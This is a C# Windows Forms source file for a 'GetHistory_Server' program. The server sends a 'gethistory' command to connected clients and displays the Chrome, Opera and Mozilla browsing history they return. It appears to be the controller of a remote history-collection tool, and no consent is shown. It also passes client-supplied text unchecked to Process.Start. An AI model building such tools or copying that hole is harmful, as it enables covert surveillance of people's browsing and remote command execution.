using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace GetHistory_Server
{
    public partial class Form1 : Form
    {
        Server server = new Server(8000, "127.0.0.1");
        int i = 0;
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

            List<HistoryItem> allHistoryItems = new List<HistoryItem>();
            List<URL> mozillaurls = new List<URL>();
            server.SendMsgToClien(server.clients[this.listBox1.SelectedIndex],"gethistory");
            //server.data = new byte[int.Parse(server.GetMsg(server.clients[this.listBox1.SelectedIndex]))];
            //int Yazaebalsa = int.Parse(server.GetMsg(server.clients[this.listBox1.SelectedIndex]).Split('!')[1]);
            //for (int i = 0; i < Yazaebalsa; i++)
            //{
            //server.data = new byte[int.Parse(server.GetMsg(server.clients[this.listBox1.SelectedIndex]))];
            mozillaurls = JsonSerializer.Deserialize<List<URL>>(server.GetMsg(server.clients[this.listBox1.SelectedIndex]));
            allHistoryItems.AddRange(JsonSerializer.Deserialize<List<HistoryItem>>(server.GetMsg(server.clients[this.listBox1.SelectedIndex])));

            //}

            //server.data = new byte[int.Parse(server.GetMsg(server.clients[this.listBox1.SelectedIndex]))];
            allHistoryItems.AddRange(JsonSerializer.Deserialize<List<HistoryItem>>(server.GetMsg(server.clients[this.listBox1.SelectedIndex])));


            for (int i = 0; i < allHistoryItems.Count; i++)
            {
                this.listBox2.Items.Add($"GoogleAndOpera: {allHistoryItems[i].URL}");
            }
            for (int i = 0; i < mozillaurls.Count; i++)
            {
                this.listBox2.Items.Add($"{mozillaurls[i].BrowserName}: {mozillaurls[i].url}");
            }

        }

        private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start(this.listBox2.SelectedItem.ToString().Split(' ').Last());

        }

        private void Form1_Load(object sender, EventArgs e)
        {
           
     
            server.Start();
            Task task = new Task(() => server.Conection());
            task.Start();
            
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            
            if (server.clients.Count > 0&&i< server.clients.Count)
            {
                this.listBox1.Items.Add($"User:{server.clients.Count}");
                i++;
            }
        }

      
    }
}
